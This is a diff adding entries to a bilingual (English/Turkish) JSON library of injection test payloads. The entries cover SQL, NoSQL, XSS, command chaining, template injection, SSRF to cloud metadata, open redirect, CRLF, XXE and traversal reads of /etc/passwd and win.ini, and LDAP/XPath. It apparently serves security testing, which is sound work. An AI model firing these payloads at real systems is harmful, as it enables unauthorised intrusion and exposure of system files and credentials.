@@ -18,7 +18,11 @@
       "SQL Tautology Bypass": "' OR 'xyz'='xyz",
       "Time-Based Sleep MySQL": "' OR SLEEP(5)--",
       "Time-Based Sleep PgSQL": "' OR PG_SLEEP(5)--",
-      "Hex Encoded Bypass": "0x27204f5220313d31"
+      "Hex Encoded Bypass": "0x27204f5220313d31",
+      "MS-SQL Time Delay": "'; WAITFOR DELAY '0:0:5'--",
+      "Or True Bypass Variant": "' OR '1'='1' --",
+      "AND True Variant": "' AND '1'='1",
+      "MySQL Comment Inline": "/*!50000SELECT*/"
     },
     "XSS & HTML Sanitization": {
       "Basic Script Tag": "<script>alert(1)</script>",
@@ -37,7 +41,12 @@
       "Bypass via HTML Entities": "&lt;script&gt;alert(1)&lt;/script&gt;",
       "Video Source Error Trigger": "<video><source onerror=alert(1)></video>",
       "Marquee Element Event": "<marquee onstart=alert(1)>",
-      "OnMouseOver Event Handler": "<span onmouseover=alert(1)>hover</span>"
+      "OnMouseOver Event Handler": "<span onmouseover=alert(1)>hover</span>",
+      "JavaScript Event Prompt": "javascript:prompt(1)",
+      "Object Event Payload": "<object data=\"javascript:alert(1)\"></object>",
+      "Script Encoding UTF-7": "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
+      "Embed Tag Payload": "<embed src=\"javascript:alert(1)\"></embed>",
+      "SVG Inline Event": "<svg><animatetransform onbegin=alert(1)></svg>"
     },
     "NoSQL & JSON Injection": {
       "MongoDB Greater Than Operator": "{\"$gt\": \"\"}",
@@ -45,7 +54,10 @@
       "MongoDB Where True Clause": "|| 1==1",
       "JSON Syntax Breakout": "\"} , {\"override\": true",
       "Array Parameter Hijack": "[\"admin\", \"user\"]",
-      "MongoDB Regex Operator": "{\"$regex\": \".*\"}"
+      "MongoDB Regex Operator": "{\"$regex\": \".*\"}",
+      "NoSQL Authentication Bypass": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+      "MongoDB Exists Operator": "{\"$exists\": true}",
+      "MongoDB JavaScript Injection": "{\"$where\": \"this.username == 'admin'\"}"
     },
     "Directory Traversal & Paths": {
       "Unix Basic Traversal": "../",
@@ -58,7 +70,10 @@
       "Null Byte Terminated Path": "../../../../../etc/passwd\u0000.jpg",
       "UNC Path Windows Share": "\\\\127.0.0.1\\c$\\windows\\win.ini",
       "Direct File Scheme Link": "file:///etc/passwd",
-      "Windows Hosts File Path": "../../../../../windows/system32/drivers/etc/hosts"
+      "Windows Hosts File Path": "../../../../../windows/system32/drivers/etc/hosts",
+      "Nested Dot Dot Slash": "..././..././etc/passwd",
+      "Double Encoded Backslash": "%255c",
+      "LFI Base64 Encode Filter": "php://filter/convert.base64-encode/resource=index.php"
     },
     "OS Command Boundaries": {
       "Semicolon Command Linker": "; id ;",
@@ -70,7 +85,10 @@
       "New Line Command Chain": "\nid\n",
       "Carriage Return Linker": "\rid\r",
       "PowerShell Command Linker": "; Invoke-Expression (id)",
-      "Bash Execution Bypass": "/bin/sh -c id"
+      "Bash Execution Bypass": "/bin/sh -c id",
+      "Command Chain with Sleep": "; sleep 5 ;",
+      "URL Encoded Semicolon": "%3bid%3b",
+      "Shunted Background Execution": "id &"
     },
     "SSTI & SSI Template Boundaries": {
       "Jinja/Twig Expression Evaluation": "{{7*7}}",
@@ -79,7 +97,9 @@
       "AngularJS Basic Expression": "{{constructor.constructor('alert(1)')()}}",
       "SSI Exec Directive Injection": "<!--#exec cmd=\"id\" -->",
       "Smarty Template Evaluation": "{7*7}",
-      "Velocity Template Evaluation": "#set($c=7*7)$c"
+      "Velocity Template Evaluation": "#set($c=7*7)$c",
+      "FreeMarker Interpolation": "${7*7}",
+      "Mako Template Syntax": "${7*7}"
     },
     "SSRF Request Boundaries": {
       "Localhost Loopback IPv4": "http://127.0.0.1:80",
@@ -87,14 +107,20 @@
       "AWS Metadata Endpoint": "http://169.254.169.254/latest/meta-data/",
       "Localhost Loopback IPv6": "http://[::]:80",
       "Zero Address Loopback": "http://0.0.0.0:80",
-      "Decimal Loopback Format": "http://2130706433:80"
+      "Decimal Loopback Format": "http://2130706433:80",
+      "Octal Loopback Format": "http://0177.0.0.1:80",
+      "DNS Rebinding Simulation": "http://make-127-0-0-1-rr.127.0.0.1.nip.io",
+      "HTTP Basic Auth Bypass": "http://admin@127.0.0.1:80"
     },
     "Open Redirect Validation": {
       "Protocol-Relative Host": "//google.com",
       "Slash Colon Protocol Bypass": "https:google.com",
       "Backslash Slash URL Bypass": "/\\google.com",
       "Standard External Destination": "http://google.com",
-      "Parameter Based Redirect": "?next=http://google.com"
+      "Parameter Based Redirect": "?next=http://google.com",
+      "Encoded Scheme Redirect": "%68%74%74%70%73%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
+      "Nested Query Destination": "http://mytrusted.com@google.com",
+      "Data URI Redirect Bypass": "data:text/html,<script>window.location='http://google.com'</script>"
     },
     "HTML Injection Elements": {
       "Heading Font Injection": "<h1>Test</h1>",
@@ -102,12 +128,17 @@
       "Underline Text Tag": "<u>Test</u>",
       "Bold Text Tag": "<b>Test</b>",
       "Italic Text Tag": "<i>Test</i>",
-      "Custom Inline Style Container": "<div style='color:red;'>Test</div>"
+      "Custom Inline Style Container": "<div style='color:red;'>Test</div>",
+      "Unclosed Tag Stress": "<div style='font-size:100px'",
+      "Large Font CSS Injection": "<span style='font-size:999px'>BIG</span>",
+      "Custom Class CSS Injection": "<style>body{background-color:red !important;}</style>"
     },
     "CRLF HTTP Header Injection": {
       "Basic CRLF Header Split": "%0d%0aSet-Cookie: test=1",
       "CRLF X-Forwarded-For Forge": "%0d%0aX-Forwarded-For: 127.0.0.1",
-      "Bypass via Carriage Return LF": "\r\nLocation: http://google.com"
+      "Bypass via Carriage Return LF": "\r\nLocation: http://google.com",
+      "UTF-8 Encoded CRLF": "%E5%98%8D%E5%98%8AHTTP/1.1",
+      "Double URL Encoded Newlines": "%250d%250aContent-Type:%20text/html"
     },
     "Format Violations & Overflows": {
       "Buffer Length (256 A's)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
@@ -119,18 +150,22 @@
       "Floating Point Precision Limit": "0.00000000000000000000000000000000000000000000000000000000000000000000001",
       "Extremely Large Numeric Value": "99999999999999999999999999999999999999999999999999999999999999999999999999999",
       "Unicode/Emoji Stress Characters": "𠜎 𠜱 𠝹 𠱓 𠱸 𠲖 𠲧 𠲼 𠵏 𠵘 𠵨 𠵫 𠵴 𠶧 𠶯 𠶳 𠶴 𠷔 𠷘 𠷤 𠷪 𠷯 𠷿 𠸎 𠸏 𠸖 𠸞 𠸢 𠸧 𠸫 𠸫 𠸱 𠸶 𠸷 𠸹 𠹊 𠹏 𠹗 𠹷 𠹻 𠺕 𠺖 𠺡 𠺢 𠺧 𠺨 𠺬 𠻗 𠻘 𠻤 𠻥 𠻪 𠻬 𠻱 𠻴 𠻵",
-      "Null Byte String Injection": "test\u0000value"
+      "Null Byte String Injection": "test\u0000value",
+      "SQL Wildcard Stress": "%_%_%",
+      "Negative Currency Limit": "-$999,999,999.00"
     },
     "XML & XPath Escapes": {
       "Basic XML Tag Inject": "<xml>test</xml>",
       "XPath Boolean Bypass": "' or 1=1 or ''='",
       "XPath Element Inject": "'] | //* | ['",
       "XML External Entity Attack Vector": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><value>&ent;</value>",
-      "XML Local File System Attack Vector": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///windows/win.ini\">]><value>&ent;</value>"
+      "XML Local File System Attack Vector": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///windows/win.ini\">]><value>&ent;</value>",
+      "XPath Injection Auth Bypass": "admin' or '1'='1"
     },
     "LDAP Search Boundaries": {
       "LDAP Boolean Query True": "*)(objectClass=*",
-      "LDAP Filter Inject": "*))(|(uid=*"
+      "LDAP Filter Inject": "*))(|(uid=*",
+      "LDAP Wildcard Query": "*"
     }
   },
   "tr": {
@@ -152,7 +187,11 @@
       "SQL Totoloji Aşımı": "' OR 'xyz'='xyz",
       "Zaman Tabanlı Gecikme MySQL": "' OR SLEEP(5)--",
       "Zaman Tabanlı Gecikme PgSQL": "' OR PG_SLEEP(5)--",
-      "Hex Kodlu Engel Aşımı": "0x27204f5220313d31"
+      "Hex Kodlu Engel Aşımı": "0x27204f5220313d31",
+      "MS-SQL Zaman Gecikmesi": "'; WAITFOR DELAY '0:0:5'--",
+      "Alternatif True Mantığı": "' OR '1'='1' --",
+      "AND True Mantığı": "' AND '1'='1",
+      "MySQL Satır İçi Yorum": "/*!50000SELECT*/"
     },
     "XSS & HTML Temizleme": {
       "Temel Script Etiketi": "<script>alert(1)</script>",
@@ -171,7 +210,12 @@
       "HTML Kod Varlıklarıyla Aşım": "&lt;script&gt;alert(1)&lt;/script&gt;",
       "Video Kaynak Hata Tetikleyici": "<video><source onerror=alert(1)></video>",
       "Marquee Olay Tetikleyici": "<marquee onstart=alert(1)>",
-      "OnMouseOver Olay Tetikleyici": "<span onmouseover=alert(1)>hover</span>"
+      "OnMouseOver Olay Tetikleyici": "<span onmouseover=alert(1)>hover</span>",
+      "JavaScript Olay İletisi": "javascript:prompt(1)",
+      "Object Etiketi Olayı": "<object data=\"javascript:alert(1)\"></object>",
+      "UTF-7 Kodlamalı Script": "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
+      "Embed Etiketi Olayı": "<embed src=\"javascript:alert(1)\"></embed>",
+      "SVG Satır İçi Animasyon Olayı": "<svg><animatetransform onbegin=alert(1)></svg>"
     },
     "NoSQL & JSON Enjeksiyonu": {
       "MongoDB Büyüktür Operatörü": "{\"$gt\": \"\"}",
@@ -179,7 +223,10 @@
       "MongoDB Where True Kuralı": "|| 1==1",
       "JSON Sözdizimi Kırma": "\"} , {\"override\": true",
       "Dizi Parametresi Ele Geçirme": "[\"admin\", \"user\"]",
-      "MongoDB Regex Eşleşme Operatörü": "{\"$regex\": \".*\"}"
+      "MongoDB Regex Eşleşme Operatörü": "{\"$regex\": \".*\"}",
+      "NoSQL Yetki Atlama": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+      "MongoDB Varlık Operatörü": "{\"$exists\": true}",
+      "MongoDB JavaScript Enjeksiyonu": "{\"$where\": \"this.username == 'admin'\"}"
     },
     "Dizin Gezinti & Dosya Yolları": {
       "Unix Basit Dizin Gezinti": "../",
@@ -192,7 +239,10 @@
       "Null Byte Sonlandırmalı Yol": "../../../../../etc/passwd\u0000.jpg",
       "UNC Ağ Paylaşım Yolu": "\\\\127.0.0.1\\c$\\windows\\win.ini",
       "Doğrudan Dosya Şeması Linki": "file:///etc/passwd",
-      "Windows Hosts Dosya Yolu": "../../../../../windows/system32/drivers/etc/hosts"
+      "Windows Hosts Dosya Yolu": "../../../../../windows/system32/drivers/etc/hosts",
+      "İç İçe Dizin Gezinti Noktaları": "..././..././etc/passwd",
+      "Çift Kodlanmış Ters Eğik Çizgi": "%255c",
+      "LFI Base64 Filtreleme": "php://filter/convert.base64-encode/resource=index.php"
     },
     "Sistem Komut Sınırları": {
       "Noktalı Virgül Komut Zinciri": "; id ;",
@@ -204,7 +254,10 @@
       "Yeni Satır Komut Zinciri": "\nid\n",
       "Satır Başı Karakter Bağlayıcı": "\rid\r",
       "PowerShell Komut Bağlayıcısı": "; Invoke-Expression (id)",
-      "Bash Çalıştırma Kısayolu": "/bin/sh -c id"
+      "Bash Çalıştırma Kısayolu": "/bin/sh -c id",
+      "Gecikmeli Komut Zinciri": "; sleep 5 ;",
+      "URL Kodlu Noktalı Virgül": "%3bid%3b",
+      "Arka Planda Çalıştırma Mantığı": "id &"
     },
     "SSTI & SSI Şablon Sınırları": {
       "Jinja/Twig İfade Değerlendirme": "{{7*7}}",
@@ -213,7 +266,9 @@
       "AngularJS Temel İfadesi": "{{constructor.constructor('alert(1)')()}}",
       "SSI Exec Direktif Enjeksiyonu": "<!--#exec cmd=\"id\" -->",
       "Smarty Şablon İfadesi": "{7*7}",
-      "Velocity Şablon İfadesi": "#set($c=7*7)$c"
+      "Velocity Şablon İfadesi": "#set($c=7*7)$c",
+      "FreeMarker Yorumlaması": "${7*7}",
+      "Mako Şablon Sözdizimi": "${7*7}"
     },
     "SSRF İstek Sınırları": {
       "Localhost Döngü Adresi IPv4": "http://127.0.0.1:80",
@@ -221,14 +276,20 @@
       "AWS Meta-veri Servis Adresi": "http://169.254.169.254/latest/meta-data/",
       "Localhost Döngü Adresi IPv6": "http://[::]:80",
       "Sıfır IP Döngü Adresi": "http://0.0.0.0:80",
-      "Desimal Sayı Döngü Formatı": "http://2130706433:80"
+      "Desimal Sayı Döngü Formatı": "http://2130706433:80",
+      "Sekizlik Döngü Adresi Formatı": "http://0177.0.0.1:80",
+      "DNS Rebinding Simülasyonu": "http://make-127-0-0-1-rr.127.0.0.1.nip.io",
+      "HTTP Kimlik Doğrulama Atlatma": "http://admin@127.0.0.1:80"
     },
     "Açık Yönlendirme (Open Redirect)": {
       "Protokolsüz Harici Adres": "//google.com",
       "Eğik Çizgili Protokol Atlama": "https:google.com",
       "Ters Eğik Çizgili Adres": "/\\google.com",
       "Standart Harici Adres Linki": "http://google.com",
-      "Parametre Tabanlı Yönlendirme": "?next=http://google.com"
+      "Parametre Tabanlı Yönlendirme": "?next=http://google.com",
+      "Kodlu Şema ile Yönlendirme": "%68%74%74%70%73%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
+      "Güvenli Adres Yetki Taklidi": "http://mytrusted.com@google.com",
+      "Data URI Yönlendirme Aşımı": "data:text/html,<script>window.location='http://google.com'</script>"
     },
     "HTML Enjeksiyon Etiketleri": {
       "Başlık Fontu Enjeksiyonu": "<h1>Test</h1>",
@@ -236,12 +297,17 @@
       "Altı Çizili Metin Etiketi": "<u>Test</u>",
       "Kalın Metin Etiketi": "<b>Test</b>",
       "Eğik Metin Etiketi": "<i>Test</i>",
-      "Satır İçi CSS Kutusu": "<div style='color:red;'>Test</div>"
+      "Satır İçi CSS Kutusu": "<div style='color:red;'>Test</div>",
+      "Kapatılmamış HTML Etiketi": "<div style='font-size:100px'",
+      "Büyük Yazı CSS Enjeksiyonu": "<span style='font-size:999px'>BIG</span>",
+      "CSS ile Arka Plan Boyama": "<style>body{background-color:red !important;}</style>"
     },
     "CRLF HTTP Başlık Enjeksiyonu": {
       "Temel CRLF Başlık Bölme": "%0d%0aSet-Cookie: test=1",
       "CRLF X-Forwarded-For Taklidi": "%0d%0aX-Forwarded-For: 127.0.0.1",
-      "Satır Başı Karakteriyle Atlama": "\r\nLocation: http://google.com"
+      "Satır Başı Karakteriyle Atlama": "\r\nLocation: http://google.com",
+      "UTF-8 Kodlu CRLF Atlama": "%E5%98%8D%E5%98%8AHTTP/1.1",
+      "Çift URL Kodlu Yeni Satır": "%250d%250aContent-Type:%20text/html"
     },
     "Format İhlalleri & Aşım Testleri": {
       "Arabellek Uzunluğu (256 A)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
@@ -253,18 +319,22 @@
       "Ondalıklı Sayı Hassasiyet Sınırı": "0.00000000000000000000000000000000000000000000000000000000000000000000001",
       "Aşırı Büyük Sayı Sınır Testi": "99999999999999999999999999999999999999999999999999999999999999999999999999999",
       "Unicode/Emoji Stres Karakterleri": "𠜎 𠜱 𠝹 𠱓 𠱸 𠲖 𠲧 𠲼 𠵏 𠵘 𠵨 𠵫 𠵴 𠶧 𠶯 𠶳 𠶴 𠷔 𠷘 𠷤 𠷪 𠷯 𠷿 𠸎 𠸏 𠸖 𠸞 𠸢 𠸧 𠸫 𠸫 𠸱 𠸶 𠸷 𠸹 𠹊 𠹏 𠹗 𠹷 𠹻 𠺕 𠺖 𠺡 𠺢 𠺧 𠺨 𠺬 𠻗 𠻘 𠻤 𠻥 𠻪 𠻬 𠻱 𠻴 𠻵",
-      "Null Byte Karakter Enjeksiyonu": "test\u0000value"
+      "Null Byte Karakter Enjeksiyonu": "test\u0000value",
+      "SQL Joker Karakter Stress Testi": "%_%_%",
+      "Negatif Para Birimi Sınırı": "-$999,999,999.00"
     },
     "XML & XPath Kaçışları": {
       "Temel XML Etiketi Enjeksiyonu": "<xml>test</xml>",
       "XPath Boolean Atlama": "' or 1=1 or ''='",
       "XPath Eleman Enjeksiyonu": "'] | //* | ['",
       "XML Dış Varlık XML Atağı (XXE)": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><value>&ent;</value>",
-      "XML Yerel Dosya Sistemi Atağı": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///windows/win.ini\">]><value>&ent;</value>"
+      "XML Yerel Dosya Sistemi Atağı": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///windows/win.ini\">]><value>&ent;</value>",
+      "XPath Enjeksiyonu Yetki Atlama": "admin' or '1'='1"
     },
     "LDAP Arama Sınırları": {
       "LDAP Doğru Filtre Atlaması": "*)(objectClass=*",
-      "LDAP Filtre Karakter Enjeksiyonu": "*))(|(uid=*"
+      "LDAP Filtre Karakter Enjeksiyonu": "*))(|(uid=*",
+      "LDAP Joker Karakter Araması": "*"
     }
   }
 }
